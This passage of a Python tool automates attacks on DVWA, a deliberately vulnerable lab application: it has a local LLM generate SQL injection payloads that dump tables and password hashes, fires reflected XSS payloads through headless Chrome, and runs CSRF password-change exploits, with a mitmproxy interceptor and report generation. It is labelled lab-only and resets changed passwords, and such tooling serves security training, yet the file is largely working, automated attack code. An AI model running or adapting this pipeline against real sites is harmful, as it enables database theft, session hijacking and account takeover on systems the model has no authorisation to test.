    opts = webdriver.ChromeOptions()

    # headless + minimal options for reliability in CI/labs
    opts.add_argument("--headless=new") if sys.version_info >= (3, 11) else opts.add_argument("--headless")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-extensions")
    opts.add_argument("--disable-dev-shm-usage")

    # Use mitmproxy as the browser proxy if requested
    if proxy_port:
        opts.add_argument(f"--proxy-server=http://127.0.0.1:{proxy_port}")

    # Optional: allow insecure certs if mitmproxy is intercepting TLS
    opts.add_argument("--ignore-certificate-errors")

    if WEBDRIVER_MANAGER:
        return webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=opts
        )

    return webdriver.Chrome(options=opts)


def selenium_login(browser, cfg: dict, timeout: int = 30):
    browser.get(f"http://{cfg['kali_ip']}/DVWA/login.php")
    wait = WebDriverWait(browser, timeout)
    wait.until(EC.presence_of_element_located((By.NAME, "username"))).send_keys(cfg["dvwa_user"])
    browser.find_element(By.NAME, "password").send_keys(cfg["dvwa_pass"])
    browser.find_element(By.NAME, "Login").click()
    wait.until(EC.url_contains("index.php"))
    if "login.php" in browser.current_url:
        raise Exception("Selenium DVWA login failed")


def selenium_set_level(browser, level: str, cfg: dict, timeout: int = 30):
    browser.get(f"http://{cfg['kali_ip']}/DVWA/security.php")
    wait = WebDriverWait(browser, timeout)
    sel  = wait.until(EC.presence_of_element_located((By.NAME, "security")))
    Select(sel).select_by_value(level)
    browser.find_element(By.NAME, "seclev_submit").click()
    time.sleep(1)


# =============================================================================
# EXECUTION HELPERS
# =============================================================================
def check_success(text: str, indicator: str) -> bool:
    if not indicator:
        return False
    if indicator.startswith("regex:"):
        return bool(re.search(indicator[6:].strip(), text, re.I | re.S))
    return re.search(re.escape(indicator), text, re.I | re.S) is not None


def get_output_zone(soup: BeautifulSoup):
    zone = soup.find("div", {"id": "main_body"})
    if zone:
        return zone
    return next(
        (p.parent for p in soup.find_all("pre")
         if p.get_text().strip().startswith("Hello")),
        None,
    )


def fetch_csrf_token(session: requests.Session, url: str) -> str:
    try:
        soup = BeautifulSoup(session.get(url, timeout=10).text, "html.parser")
        tag  = soup.find("input", {"name": "user_token"})
        return tag["value"] if tag else ""
    except Exception:
        return ""


def sqli_send(session: requests.Session, level: str, payload: str,
              cfg: dict, timeout: int = 10) -> requests.Response:
    base = f"http://{cfg['kali_ip']}"
    if level == "high":
        # HIGH: set payload in session via POST to session-input.php, then GET main page
        session.post(
            f"{base}{ENDPOINTS['SQLI_SESSION']}",
            data={"id": payload, "Submit": "Submit"},
            timeout=timeout,
        )
        return session.get(f"{base}{ENDPOINTS['SQLI']}", timeout=timeout)
    # LOW / MEDIUM: direct GET with id parameter
    return session.get(
        f"{base}{ENDPOINTS['SQLI']}",
        params={"id": str(payload), "Submit": "Submit"},
        timeout=timeout,
    )


# =============================================================================
# SQLI ENUMERATION
# =============================================================================
def run_sqli_enum(session: requests.Session, level: str,
                  analysis: dict, cfg: dict, timeout: int = 10) -> str:
    lines = ["\n  ── SQLI Enumeration ─────────────────────────────────"]

    # Wrapped the expected array in a JSON object to improve LLM parsing reliability.
    response = ollama_ask(
        f"""SQLI confirmed at {level.upper()} in DVWA. 2-column query (first_name, last_name).
Level note: {LEVEL_CONTEXT['SQLI'].get(level, '')}
Generate exactly 5 UNION SELECT enumeration payloads.
Output ONLY a JSON object with a 'stages' array, no other text:
{{
  "stages": [
    {{"stage":"DB Version",       "payload":"...","success_indicator":"..."}},
    {{"stage":"Current Database", "payload":"...","success_indicator":"..."}},
    {{"stage":"All Tables",       "payload":"...","success_indicator":"..."}},
    {{"stage":"User Columns",     "payload":"...","success_indicator":"..."}},
    {{"stage":"User Hashes",      "payload":"...","success_indicator":"..."}}
  ]
}}""",
        cfg,
        json_mode=True,
        call_type="enum"
    )
    
    # Safely extract the stages array regardless of how the LLM wrapped it
    if isinstance(response, dict):
        stages = response.get("stages", [])
    elif isinstance(response, list):
        stages = response
    else:
        stages = []

    if not stages:
        lines.append("  Could not generate enumeration stages.")
        return "\n".join(lines)

    for stage in stages:
        label   = stage.get("stage", "Unknown")
        payload = stage.get("payload", "")
        ind     = stage.get("success_indicator", "Surname:")

        lines.append(f"\n  Stage   : {label}")
        lines.append(f"  Payload : {payload}")

        try:
            r    = sqli_send(session, level, payload, cfg, timeout)
            soup = BeautifulSoup(r.text, "html.parser")
            zone = get_output_zone(soup)
            rows = [pre.get_text(" ", strip=True)
                    for pre in (zone.find_all("pre") if zone else [])
                    if pre.get_text(strip=True)]

            if rows:
                lines.append(f"  Result  : {len(rows)} row(s)")
                for row in rows[:5]:
                    lines.append(f"    {row[:300]}")
            else:
                i = r.text.find("Surname:")
                if i != -1:
                    snippet = r.text[max(0, i-10):i+200].replace("\n", " ").strip()
                    lines.append(f"  Result  : {snippet[:300]}")
                else:
                    lines.append(f"  Result  : No data (looked for '{ind}')")
        except Exception as e:
            lines.append(f"  ERROR   : {type(e).__name__}: {e}")

    return "\n".join(lines)


# =============================================================================
# XSS ENUMERATION  (Selenium — needs real JS engine)
# =============================================================================
def run_xss_enum(session: requests.Session, level: str,
                 analysis: dict, cfg: dict, timeout: int = 15) -> str:
    lines = [
        "\n  ── XSS Enumeration (Selenium) ───────────────────────",
        "  XSS is client-side JS — launching headless Chrome to execute and capture output.",
    ]

    stages = analysis.get("enumeration", [])
    if not stages:
        lines.append("  No XSS enumeration stages in analysis.")
        return "\n".join(lines)

    browser = None
    try:
        browser = selenium_setup(cfg["proxy_port"])
        selenium_login(browser, cfg)
        selenium_set_level(browser, level, cfg)

        browser.get(f"http://{cfg['kali_ip']}/DVWA/")
        for c in session.cookies:
            try:
                browser.add_cookie({"name": c.name, "value": c.value})
            except Exception:
                pass

        for stage in stages:
            label   = stage.get("stage", "Unknown")
            payload = stage.get("payload", "")

            lines.append(f"\n  Stage   : {label}")
            lines.append(f"  Payload : {payload}")

            try:
                url = (f"http://{cfg['kali_ip']}{ENDPOINTS['XSS']}"
                       f"?{urlencode({'name': payload})}")
                browser.get(url)

                result   = None
                deadline = time.time() + 5
                while time.time() < deadline:
                    body = browser.find_element(By.TAG_NAME, "body").text
                    if "XSS_RESULT::" in body:
                        m = re.search(r"XSS_RESULT::(.+)", body)
                        if m:
                            result = m.group(1).strip()
                        break
                    time.sleep(0.3)

                if result:
                    lines.append(f"  Result  : {result}")
                else:
                    soup = BeautifulSoup(browser.page_source, "html.parser")
                    zone = get_output_zone(soup)
                    raw  = zone.get_text(strip=True)[:200] if zone else "(no output zone)"
                    lines.append(f"  Result  : JS did not write XSS_RESULT:: — zone: {raw}")

            except Exception as e:
                lines.append(f"  ERROR   : {type(e).__name__}: {e}")

    except Exception as e:
        lines.append(f"  Selenium ERROR: {type(e).__name__}: {e}")
    finally:
        if browser:
            browser.quit()

    return "\n".join(lines)


# =============================================================================
# PAYLOAD EXECUTION ENGINE
# =============================================================================
def execute_payloads(session: requests.Session, level: str, analysis: dict,
                     cfg: dict, interceptor=None, timeout: int = 10) -> str:
    vuln = analysis.get("vuln", "")
    if not vuln or vuln not in ENDPOINTS:
        return f"ERROR: unknown vuln type '{vuln}'"
    base_url = f"http://{cfg['kali_ip']}{ENDPOINTS[vuln]}"
    payloads = analysis.get("payloads", [])
    results = []
    enumerated = False
    for idx, p in enumerate(payloads, 1):
        raw = p.get("payload", "")
        desc = p.get("description", "")
        ind = p.get("success_indicator", "")
        results.append(f"\nPayload {idx}: {raw}")
        results.append(f" Intent : {desc}")
        results.append(f" Expects : {ind}")
        try:
            # ── SQLI ─────────────────────────────────────────────────────────
            if vuln == "SQLI":
                r = sqli_send(session, level, raw, cfg, timeout)
                # Deterministic DVWA SQLi success detection
                soup = BeautifulSoup(r.text, "html.parser")
                zone = get_output_zone(soup)
                ok = False
                if zone:
                    if zone.find("pre") or ("First name:" in r.text and "Surname:" in r.text):
                        ok = True
                if ok:
                    soup = BeautifulSoup(r.text, "html.parser")
                    zone = get_output_zone(soup)
                    rows = [
                        pre.get_text(" ", strip=True)
                        for pre in (zone.find_all("pre") if zone else [])
                        if pre.get_text(strip=True)
                    ]
                    results.append(" Result : SUCCESS")
                    if rows:
                        for row in rows[:5]:
                            results.append(f" Leaked : {row[:300]}")
                    else:
                        results.append(" Indicator matched but no parsed rows found.")
                    if not enumerated:
                        enumerated = True
                        results.append(
                            run_sqli_enum(session, level, analysis, cfg, timeout)
                        )
                else:
                    results.append(
                        f" Result : FAILED (HTTP {r.status_code}) — "
                        f"'{ind}' not found in response"
                    )
            # ── XSS ──────────────────────────────────────────────────────────
            elif vuln == "XSS":
                r = session.get(base_url, params={"name": raw}, timeout=timeout)
                soup = BeautifulSoup(r.text, "html.parser")
                zone = get_output_zone(soup)
                # Use raw response text for detection — BeautifulSoup can strip attrs
                raw_body = r.text
                zone_html = str(zone) if zone else raw_body
                escaped = "&lt;" in raw_body and "&gt;" in raw_body
                has_event_handler = bool(re.search(r'on\w+\s*=', raw_body, re.I))
                has_dangerous_tag = bool(re.search(
                    r'<img[^>]+onerror|<svg[^>]+onload|<iframe[^>]+src|<body[^>]+onload',
                    raw_body, re.I
                ))
                injected_present = any(
                    frag in raw_body
                    for frag in ["onerror=", "onerror =", "onload=", "onload =",
                                 "javascript:", "onclick=", "onmouseover="]
                )
                if not escaped and (has_event_handler or has_dangerous_tag) and injected_present:
                    results.append(" Result : SUCCESS — reflected unescaped event handler")
                    # Show the matched snippet from raw response
                    # Find the Hello pre block which contains the reflected payload
                    hello_match = re.search(r'<pre>Hello(.+?)</pre>', raw_body, re.I | re.S)
                    if hello_match:
                        reflected_content = hello_match.group(1).strip()[:200]
                        results.append(f" Reflected : Hello{reflected_content}")
                    else:
                        m = re.search(r'(on\w+\s*=[^\s>]{0,80})', raw_body, re.I)
                        if m:
                            results.append(f" Reflected : {m.group(0).strip()[:200]}")
                    if not enumerated:
                        enumerated = True
                        enum_stages = analysis.get("enumeration", [])
                        if enum_stages:
                            results.append(run_xss_enum(session, level, analysis, cfg, timeout))
                        else:
                            # No enumeration stages from AI — skip, don't call run_sqli_enum
                            results.append(" No enumeration stages provided by AI for this payload set.")
                elif escaped:
                    results.append(" Result : PARTIAL — payload was HTML-escaped by server")
                else:
                    # Debug: show what was actually in the response around the injection point
                    hello_i = raw_body.find("Hello")
                    snippet = raw_body[hello_i:hello_i+300].replace("\n"," ").strip() if hello_i != -1 else "(Hello not found)"
                    results.append(f" Result : FAILED — no unescaped event handler in response")
                    results.append(f" Response zone : {snippet[:200]}")
            # ── CSRF ─────────────────────────────────────────────────────────
            elif vuln == "CSRF":
                if isinstance(raw, str):
                    try:
                        params = json.loads(raw)
                    except Exception:
                        params = {"password_new": "hacked123",
                                  "password_conf": "hacked123", "Change": "Change"}
                elif isinstance(raw, dict):
                    params = dict(raw)
                else:
                    params = {"password_new": "hacked123",
                              "password_conf": "hacked123", "Change": "Change"}
                # Legitimate path: with fresh token
                if interceptor:
                    interceptor.inject_token = True
                token = fetch_csrf_token(session, base_url)
                legit = dict(params)
                
                if token:
                    # Fix: Replace exact placeholders instead of blindly overwriting the AI's intended payload token.
                    placeholder_found = False
                    for k, v in legit.items():
                        if str(v).strip() == "<SESSION_TOKEN>":
                            legit[k] = token
                            placeholder_found = True
                    
                    # If AI didn't provide a token parameter at all, inject it normally
                    if not placeholder_found and "user_token" not in legit and "HTTP_USER_TOKEN" not in legit:
                        legit["user_token"] = token
                        
                r_legit = session.get(base_url, params=legit, timeout=timeout)
                legit_ok = "Password Changed" in r_legit.text
                results.append(
                    f" With token : {'SUCCESS — password changed on server' if legit_ok else 'FAILED'}"
                )
                if legit_ok:
                    results.append(f" Changed to : {params.get('password_new', '?')}")
                    results.append(f" Token used : {token[:16]}..." if token else " Token used : none")
                # Reset password back
                if interceptor:
                    interceptor.inject_token = True
                t2 = fetch_csrf_token(session, base_url)
                reset = {"password_new": cfg["dvwa_pass"],
                         "password_conf": cfg["dvwa_pass"], "Change": "Change"}
                if t2:
                    reset["user_token"] = t2
                r_reset = session.get(base_url, params=reset, timeout=timeout)
                reset_ok = "Password Changed" in r_reset.text
                results.append(f" Reset : {'Password restored to original' if reset_ok else 'WARNING: reset may have failed'}")
                # Exploit path: no token (disable injection to test defense)
                if interceptor:
                    interceptor.inject_token = False
                exploit = {"password_new": "hacked123",
                             "password_conf": "hacked123", "Change": "Change"}
                r_exploit = session.get(base_url, params=exploit, timeout=timeout)
                exp_ok = "Password Changed" in r_exploit.text
                results.append(
                    f" Without token : "
                    f"{'SUCCESS — no CSRF protection!' if exp_ok else 'FAILED — token defense held'}"
                )
                if exp_ok:
                    if interceptor:
                        interceptor.inject_token = True
                    t3 = fetch_csrf_token(session, base_url)
                    reset2 = {"password_new": cfg["dvwa_pass"],
                              "password_conf": cfg["dvwa_pass"], "Change": "Change"}
                    if t3:
                        reset2["user_token"] = t3
                    session.get(base_url, params=reset2, timeout=timeout)
                    results.append(" Reset : Done.")
        except Exception as e:
            results.append(f" Result : ERROR — {type(e).__name__}: {e}")
    # Show packets captured by mitmproxy interceptor (HIGH level)
    if interceptor and interceptor.captured:
        results.append("\n ── mitmproxy Intercept Log ────────────────────────")
        for pkt in list(interceptor.captured)[-15:]:
            event = pkt.get("event", "TRAFFIC")
            if event == "SQLI_SESSION_POST":
                results.append(f" [SQLI] POST intercepted → {pkt['url'][:70]}")
                results.append(f" Payload in-flight : {pkt['req_body'][:200]}")
                results.append(f" Note : {pkt['note']}")
            elif event == "CSRF_TOKEN_INJECTED":
                results.append(f" [CSRF] Token injected by interceptor → {pkt['url'][:70]}")
                results.append(f" Note : {pkt['note']}")
            elif event == "XSS_REFLECTED_UNESCAPED":
                results.append(f" [XSS] Unescaped reflection detected at packet level")
                results.append(f" URL : {pkt['url'][:70]}")
                results.append(f" Snippet : {pkt.get('snippet','')[:150]}")
                results.append(f" Note : {pkt['note']}")
            else:
                results.append(f" {pkt.get('method','?')} {pkt['url'][:70]} → {pkt.get('status','?')}")
        if interceptor.extracted_token:
            results.append(f"\n Extracted CSRF token : {interceptor.extracted_token[:32]}...")
    return "\n".join(results)

def reconcile_csrf_analysis(analysis_data: dict, exec_result: str) -> dict:
    """Override AI likelihood/impact if execution shows token defense held."""
    if analysis_data.get("vuln") != "CSRF":
        return analysis_data

    lines = exec_result.lower()
    without_token_lines = [l for l in lines.splitlines() if "without token" in l]
    all_failed = without_token_lines and all("failed" in l for l in without_token_lines)

    if all_failed:
        # Patch the analysis text to reflect reality
        original = analysis_data.get("analysis_text", "")
        patch = (
            "\n\n[EXECUTION OVERRIDE] All tokenless exploit attempts were blocked. "
            "The Anti-CSRF token defense is functioning correctly at this level. "
            "Likelihood should be rated LOW — exploitation requires stealing a valid "
            "user_token from the victim's session first."
        )
        analysis_data["analysis_text"] = original + patch
        analysis_data["likelihood_override"] = "low"

    return analysis_data


# =============================================================================
# CORE ANALYSIS LOOP
# =============================================================================
def run_analysis(kali_ip, ssh_user, ssh_key, windows_username, dvwa_user, dvwa_pass,
                 ollama_model, error_log, selected_levels, selected_vulns,
                 proxy_port, progress=gr.Progress()):

    # Build dynamic SSH key path if user didn't override it
    if not ssh_key or "gpandha" in ssh_key:   # auto-build if default/hardcoded
        ssh_key = rf"C:\Users\{windows_username}\kali_ssh"

    cfg = {
        "kali_ip":      kali_ip,
        "ssh_user":     ssh_user,
        "ssh_key":      ssh_key,          # now dynamic
        "dvwa_user":    dvwa_user,
        "dvwa_pass":    dvwa_pass,
        "ollama_model": ollama_model,
        "ollama_url":   "http://localhost:11434/api/chat",
        "proxy_port":   int(proxy_port),
        "error_log":    error_log,
    }

    wait_for_ollama_model(cfg)

    start_time   = datetime.now()
    logs         = []
    report_files = []

    def log(msg):
        entry = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
        logs.append(entry)
        print(entry)
        return "\n".join(logs)

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        log(f"Connecting to Kali at {kali_ip}...")
        ssh.connect(
            kali_ip,
            username=ssh_user, key_filename=ssh_key,
            timeout=45, banner_timeout=45, auth_timeout=45,
            allow_agent=False, look_for_keys=False,
        )
        dvwa_check, _ = ssh_run(ssh, "ls /var/www/html/DVWA/vulnerabilities", error_log)
        if "sqli" not in dvwa_check:
            raise Exception("DVWA not found at /var/www/html/DVWA/vulnerabilities")
        log("SSH connected. DVWA confirmed.")

        log("Running Nmap + NVD + NSE recon...")
        nmap_report = run_recon(ssh, kali_ip, cfg, error_log)
        log("Recon complete.")

        levels = [l for l in ["low", "medium", "high"] if l in selected_levels]
        vulns  = [v for v in ["SQLI", "XSS", "CSRF"]   if v in selected_vulns]

        if not levels or not vulns:
            raise Exception("Select at least one level and one vulnerability.")

        total = len(levels) * len(vulns) * 2
        step  = 0

        for level in levels:
            level_start = datetime.now()
            log(f"\n{'='*55}\nLevel: {level.upper()}\n{'='*55}")

            # ── Setup session (HIGH uses plain mitmdump proxy) ──────────────────────
            proxies = None

            if level == "high" and MITMPROXY:
                port = find_free_port(cfg["proxy_port"])

                log(f"  HIGH level → starting active mitmproxy interceptor on port {port}")

                cfg["proxy_port"] = port
                interceptor = start_mitmproxy(port)

                proxies = {
                    "http": f"http://127.0.0.1:{port}",
                    "https": f"http://127.0.0.1:{port}"
                }

                time.sleep(1)
                log("  mitmproxy active — requests will be intercepted and modified.")
            else:
                interceptor = None

            session = dvwa_login(cfg, proxies=proxies)

            # enforce proxy routing
            if proxies:
                session.proxies.update(proxies)
                session.verify = False

            dvwa_set_level(session, level, cfg)
            log(f"  Session ready (security={level}).")

            all_php      = {}
            all_analyses = {}
            exec_results = {}

            for vuln in vulns:
                # ── Pull PHP source ──────────────────────────────────────────
                vuln_start = datetime.now()          # ← add this
                log(f"  Analysing {vuln} [{level.upper()}]...")

                php_path = PHP_PATHS[vuln].format(level=level)
                php_code, err = ssh_run(ssh, f"cat {php_path}", error_log)
                if not php_code.strip():
                    log(f"    WARNING: Could not read {php_path}: {err}")
                    php_code = f"[Source unavailable: {err}]"

                if vuln == "SQLI" and level == "high":
                    si, _ = ssh_run(
                        ssh,
                        "cat /var/www/html/DVWA/vulnerabilities/sqli/session-input.php",
                        error_log,
                    )
                    if si.strip():
                        php_code += f"\n\n--- session-input.php ---\n{si}"

                all_php[vuln] = php_code

                # ── Ollama call 1: prose analysis for report ─────────────────
                analysis_text = ollama_ask(
                    build_analysis_prompt(vuln, level, php_code), cfg, json_mode=False, call_type="analysis"
                )
                if not analysis_text or analysis_text == "[Ollama failed]":
                    log(f"    WARNING: Ollama analysis failed for {vuln}")
                    analysis_text = "Analysis unavailable — Ollama did not return a response."

                # ── Ollama call 2: minimal JSON payloads for execution ────────
                payloads_raw = ollama_ask(
                    build_payload_prompt(vuln, level, php_code), cfg, json_mode=True, call_type="payload"
                )
                log(f"    [DEBUG] Payload raw type: {type(payloads_raw).__name__} — value: {str(payloads_raw)[:300]}")

                if isinstance(payloads_raw, list):
                    payloads_list    = payloads_raw
                    enumeration_list = []
                elif isinstance(payloads_raw, dict):
                    if "payload" in payloads_raw:
                        payloads_list    = [payloads_raw]
                        enumeration_list = []
                    else:
                        payloads_list    = payloads_raw.get("payloads", [])
                        enumeration_list = payloads_raw.get("enumeration", [])
                        if not payloads_list:
                            payloads_list = next(
                                (v for v in payloads_raw.values()
                                 if isinstance(v, list) and v
                                 and isinstance(v[0], dict) and "payload" in v[0]),
                                []
                            )
                else:
                    payloads_list    = []
                    enumeration_list = []

                payloads_list    = [p for p in payloads_list    if isinstance(p, dict) and "payload" in p]
                enumeration_list = [e for e in enumeration_list if isinstance(e, dict) and ("payload" in e or "stage" in e)]
                # Normalise: if object has 'query' instead of 'payload', remap it
                enumeration_list = [
                    {**e, "payload": e.get("payload") or e.get("query", "")}
                    for e in enumeration_list
                ]

                analysis_data = {
                    "vuln":          vuln,
                    "level":         level,
                    "analysis_text": analysis_text,
                    "payloads":      payloads_list,
                    "enumeration":   enumeration_list,
                }
                all_analyses[vuln] = analysis_data
                log(f"    Analysis: OK  |  Payloads: {len(payloads_list)}  |  Enumeration: {len(enumeration_list)}")

                llm_done = datetime.now()

                # ── Execute payloads immediately ──────────────────────────────
                log(f"  Executing {vuln} [{level.upper()}]...")
                exec_start = datetime.now()
                # Prepare interceptor state for this vulnerability
                if interceptor:
                    # clear any previous captures to keep logs focused per vuln
                    try:
                        interceptor.captured.clear()
                    except Exception:
                        pass
                    interceptor.extracted_token = None
                    interceptor.active_vuln = vuln
                    interceptor.active_level = level
                    interceptor.inject_token = (vuln == "CSRF")

                try:
                    exec_results[vuln] = execute_payloads(
                        session, level, analysis_data, cfg, interceptor
                    )
                except Exception as exec_err:
                    exec_results[vuln] = f"Execution error: {type(exec_err).__name__}: {exec_err}"
                    log(f"  ERROR during {vuln} execution: {exec_err}")

                # ── Reconcile CSRF after execution has a result ───────────────
                if vuln == "CSRF":
                    all_analyses[vuln] = reconcile_csrf_analysis(
                        all_analyses[vuln], exec_results[vuln]
                    )
                
                vuln_duration = datetime.now() - vuln_start
                llm_duration   = llm_done - vuln_start
                exec_duration  = datetime.now() - exec_start
                log(f"  Done: {vuln}. (took {vuln_duration.seconds}s)")
                exec_results[f"{vuln}_duration"] = str(vuln_duration)
                exec_results[f"{vuln}_duration_llm"]  = str(llm_duration)  
                exec_results[f"{vuln}_duration_exec"] = str(exec_duration)
                

            # ── Build report ─────────────────────────────────────────────────
            ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            duration = datetime.now() - level_start

            lines = [
                "=" * 80,
                "         DVWA VULNERABILITY ASSESSMENT REPORT",
                "=" * 80,
                f"Report Date  : {ts}",
                f"Level        : {level.upper()}",
                f"Target       : http://{kali_ip}/DVWA/",
                f"Vulns Tested : {', '.join(vulns)}",
                f"Duration     : {duration}",
                f"Author       : Gavin Pandha  (AI-Assisted Pipeline)",
                "",
                "-" * 80, "NETWORK RECONNAISSANCE", "-" * 80,
                nmap_report,
            ]

            for vuln in vulns:
                a = all_analyses.get(vuln, {
                    "vuln": vuln, "level": level,
                    "analysis_text": "Analysis unavailable.",
                    "payloads": [], "enumeration": []
                })
                lines += [
                    "", "=" * 80,
                    f"VULNERABILITY: {vuln} [{level.upper()}]",
                    "=" * 80, "",
                    "ANALYSIS", "-" * 40,
                    a.get("analysis_text", "No analysis available."),
                    "", "PAYLOADS TESTED", "-" * 40,
                ]
                for i, p in enumerate(a.get("payloads", []), 1):
                    lines += [
                        f"  {i}. {p.get('payload', '')}",
                        f"     Intent  : {p.get('description', '')}",
                        f"     Expects : {p.get('success_indicator', '')}",
                    ]
                lines += [
                    "", "EXECUTION RESULTS", "-" * 40,
                    exec_results.get(vuln, "No results."),
                    "",
                    f"Time (Total) : {exec_results.get(vuln + '_duration',      'N/A')}",
                    f"Time (LLM)   : {exec_results.get(vuln + '_duration_llm',  'N/A')}",
                    f"Time (Exec)  : {exec_results.get(vuln + '_duration_exec', 'N/A')}",
                    "",
                    "=" * 40,   # ← hard separator so PHP source can never be mistaken for results
                    "RAW PHP SOURCE", "-" * 40,
                    all_php.get(vuln, ""),
                ]

            lines += ["", "=" * 80, "End of Report", "=" * 80]

            report_text = "\n".join(lines)
            safe_ts     = ts.replace(":", "-").replace(" ", "_")
            filename    = f"DVWA_Report_{level.upper()}_{safe_ts}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(report_text)
            report_files.append(filename)
            log(f"Report saved: {filename}")

            # Shutdown mitmdump if it was started for this level
            if level == "high":
                stop_mitmproxy()
                log("  mitmproxy interceptor stopped.")


        log("\nAll assessments complete.")
        return "\n".join(logs), report_files

    except Exception as e:
        log(f"FATAL: {e}")
        return "\n".join(logs), report_files
    finally:
        ssh.close()


# =============================================================================
# GRADIO GUI
# =============================================================================
with gr.Blocks(title="DVWA AI Pentesting Pipeline") as demo:
    gr.Markdown("# DVWA AI-Assisted Pentesting Pipeline")
    gr.Markdown(
        "**Lab use only.**  CSRF tests temporarily change the DVWA password — auto-reset on success.  "
        "HIGH level traffic is routed through the mitmproxy interceptor."
    )
    
    with gr.Row():
        kali_ip   = gr.Textbox(label="Kali IP",         value=DEFAULT_CONFIG["kali_ip"])
        ssh_user  = gr.Textbox(label="SSH Username",     value=DEFAULT_CONFIG["ssh_user"])
    with gr.Row():
        windows_username = gr.Textbox(
            label="Windows Username (for SSH key path)",
            value=DEFAULT_CONFIG["windows_username"]
        )
        ollama_model = gr.Textbox(
            label="Ollama Model (e.g. qwen3-coder:30b or qwen2.5-coder:14b)",
            value=DEFAULT_CONFIG["ollama_model"]
        )
        ssh_key   = gr.Textbox(label="SSH Key Path (optional override)", 
                               value=DEFAULT_CONFIG["ssh_key"])
        dvwa_user = gr.Textbox(label="DVWA Username", value=DEFAULT_CONFIG["dvwa_user"])
    with gr.Row():
        dvwa_pass    = gr.Textbox(label="DVWA Password",  value=DEFAULT_CONFIG["dvwa_pass"],
                                  type="password")
    with gr.Row():
        error_log  = gr.Textbox(label="Error Log File",          value=DEFAULT_CONFIG["error_log"])
        proxy_port = gr.Number( label="Proxy Port (HIGH level)", value=DEFAULT_CONFIG["proxy_port"],
                                precision=0)

    levels = gr.CheckboxGroup(
        choices=["low", "medium", "high"],
        label="Security Levels",
        value=["low", "medium", "high"],
    )
    vulns = gr.CheckboxGroup(
        choices=["SQLI", "XSS", "CSRF"],
        label="Vulnerabilities",
        value=["SQLI", "XSS", "CSRF"],
    )

    run_btn    = gr.Button("Run Analysis", variant="primary")
    log_output = gr.Textbox(label="Live Log", lines=25, interactive=False)
    reports    = gr.File(label="Download Reports", visible=False)

    def on_run(kali_ip, ssh_user, ssh_key, windows_username, ollama_model, dvwa_user, dvwa_pass,
               error_log, levels, vulns, proxy_port):
        log_text, files = run_analysis(
            kali_ip, ssh_user, ssh_key, windows_username, dvwa_user, dvwa_pass,
            ollama_model, error_log, levels, vulns, proxy_port,
        )
        return log_text, (gr.File(value=files, visible=True) if files else gr.File(visible=False))

    run_btn.click(
        on_run,
        inputs=[kali_ip, ssh_user, ssh_key, windows_username, ollama_model, dvwa_user, dvwa_pass,
                error_log, levels, vulns, proxy_port],
        outputs=[log_output, reports],
    )


# =============================================================================
# ENTRY POINT
# =============================================================================
if __name__ == "__main__":
    start_ollama()
    demo.launch(server_name="127.0.0.1", server_port=7860, share=False)